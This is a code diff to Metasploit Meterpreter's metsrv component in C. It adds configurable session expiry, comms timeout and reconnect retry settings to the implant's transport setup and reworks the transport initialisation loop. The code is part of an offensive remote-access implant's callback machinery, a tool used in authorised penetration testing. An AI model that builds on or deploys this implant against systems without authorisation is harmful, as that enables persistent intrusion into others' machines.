@@ -12,6 +12,18 @@
 
 extern Command* extensionCommands;
 
+typedef struct _MetsrvTimeoutSettings
+{
+	/*! @ brief The total number of seconds to wait before killing off the session. */
+	int expiry;
+	/*! @ brief The total number of seconds to wait for a new packet before killing off the session. */
+	int comms;
+	/*! @ brief The total number of seconds to keep retrying for before a new session is established. */
+	UINT retry_total;
+	/*! @ brief The number of seconds to wait between reconnects. */
+	UINT retry_wait;
+} MetsrvTimeoutSettings;
+
 typedef struct _MetsrvConfigData
 {
 	wchar_t transport[28];
@@ -21,8 +33,11 @@ typedef struct _MetsrvConfigData
 	wchar_t proxy_username[112];
 	wchar_t proxy_password[112];
 	BYTE ssl_cert_hash[28];
-	int expiration_timeout;
-	int comm_timeout;
+	union
+	{
+		char placeholder[sizeof(MetsrvTimeoutSettings)];
+		MetsrvTimeoutSettings values;
+	} timeouts;
 } MetsrvConfigData;
 
 MetsrvConfigData global_config =
@@ -34,8 +49,7 @@ MetsrvConfigData global_config =
 	.proxy_username = L"METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
 	.proxy_password = L"METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
 	.ssl_cert_hash = "METERPRETER_SSL_CERT_HASH\x00\x00\x00",
-	.expiration_timeout = 0xb64be661,
-	.comm_timeout = 0xaf79257f
+	.timeouts.placeholder = "METERP_TIMEOUTS\x00"
 };
 
 // include the Reflectiveloader() function
@@ -132,14 +146,22 @@ static Transport* transport_create(MetsrvConfigData* config, BOOL stageless)
 
 	if (wcscmp(transport, L"SSL") == 0)
 	{
-		t = transport_create_tcp(url);
+		t = transport_create_tcp(url, config->timeouts.values.expiry, config->timeouts.values.comms,
+			config->timeouts.values.retry_total, config->timeouts.values.retry_wait);
 	}
 	else
 	{
 		BOOL ssl = wcscmp(transport, L"HTTPS") == 0;
 		t = transport_create_http(ssl, url, config->ua, config->proxy, config->proxy_username,
-			config->proxy_password, config->ssl_cert_hash, config->expiration_timeout, config->comm_timeout);
+			config->proxy_password, config->ssl_cert_hash, config->timeouts.values.expiry, config->timeouts.values.comms,
+			config->timeouts.values.retry_total, config->timeouts.values.retry_wait);
 	}
+
+	dprintf("[TRANSPORT] Comms timeout: %u %08x", t->comms_timeout, t->comms_timeout);
+	dprintf("[TRANSPORT] Session timeout: %u %08x", t->expiration_time, t->expiration_time);
+	dprintf("[TRANSPORT] Session expires: %u %08x", t->expiration_end, t->expiration_end);
+	dprintf("[TRANSPORT] Retry total: %u %08x", t->retry_total, t->retry_total);
+	dprintf("[TRANSPORT] Retry wait: %u %08x", t->retry_wait, t->retry_wait);
 
 	return t;
 }
@@ -228,12 +250,18 @@ DWORD server_setup(SOCKET fd)
 				// Work off the next transport
 				remote->transport = remote->nextTransport;
 
-				dprintf("[SERVER] initialising transport 0x%p", remote->transport->transport_init);
-				if (remote->transport->transport_init && !remote->transport->transport_init(remote, fd))
+				if (remote->transport->transport_init)
 				{
-					// Hackety hack hack!
-					Sleep(5000);
-					break;
+					dprintf("[SERVER] attempting to initialise transport 0x%p", remote->transport->transport_init);
+					// Each transport has its own set of retry settings and each should honour
+					// them individually.
+					if (!remote->transport->transport_init(remote, fd))
+					{
+						dprintf("[SERVER] transport initialisation failed.");
+
+						// when we have a list of transports, we'll iterate to the next one.
+						break;
+					}
 				}
 
 				// once initialised, we'll clean up the next transport so that we don't try again
@@ -260,6 +288,8 @@ DWORD server_setup(SOCKET fd)
 					{
 						remote->transport->transport_reset(remote->transport);
 					}
+
+					// when we have a list of transports, we'll iterate to the next one (perhaps?)
 					remote->nextTransport = remote->transport;
 				}
 			}
